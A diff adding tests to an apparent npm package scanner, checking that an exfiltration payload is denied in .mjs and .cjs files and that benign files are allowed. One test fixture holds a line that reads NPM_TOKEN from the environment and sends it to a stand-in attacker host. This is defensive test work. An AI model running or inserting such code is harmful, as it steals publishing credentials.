@@ -126,6 +126,39 @@ test("credential plus network inside a scanned .js file is DENY", () => {
   assert.ok(verdict.findings.some((f) => f.rule === "file-exfil"));
 });
 
+test("same exfil payload in .mjs / .cjs files is DENY, not an evasion", () => {
+  // .mjs and .cjs are JavaScript Node executes; the same code that DENYs
+  // in index.js must DENY in index.mjs / index.cjs too.
+  for (const filename of ["index.mjs", "index.cjs"]) {
+    const verdict = vetPackageContents(
+      pkg({
+        files: {
+          [filename]:
+            "const t = process.env.NPM_TOKEN; fetch('https://evil.example', { body: t });",
+        },
+      }),
+    );
+    assert.equal(verdict.verdict, "DENY", filename);
+    assert.ok(
+      verdict.findings.some((f) => f.rule === "file-exfil"),
+      JSON.stringify(verdict.findings),
+    );
+  }
+});
+
+test("benign .mjs / .cjs files stay ALLOW", () => {
+  const verdict = vetPackageContents(
+    pkg({
+      files: {
+        "index.mjs": "export const x = 1;\n",
+        "index.cjs": "const home = process.env.HOME; module.exports = { home };\n",
+      },
+    }),
+  );
+  assert.equal(verdict.verdict, "ALLOW");
+  assert.deepEqual(verdict.findings, []);
+});
+
 test("typosquat at distance 1 is DENY; the popular name itself is ALLOW", () => {
   const squat = vetPackageContents(pkg({ name: "reactt" }));
   assert.equal(squat.verdict, "DENY");
